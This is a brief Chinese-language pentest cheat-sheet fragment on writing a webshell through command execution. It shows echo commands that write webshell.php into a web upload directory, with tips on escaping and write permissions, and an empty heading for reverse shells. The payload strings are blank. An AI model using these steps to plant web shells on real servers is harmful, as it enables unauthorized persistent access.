### 一、命令执行写webshel
echo 写入
```
echo "" > webshell.php
```
linux中要转义 \$ (使用单引号包裹则不需要转义)， 并且必须写到有写入权限的目录
```
echo "" > /var/www/html/upload/webshell.php
```
/var/www/html/upload必须存在且有可写权限

### 二、反弹shell

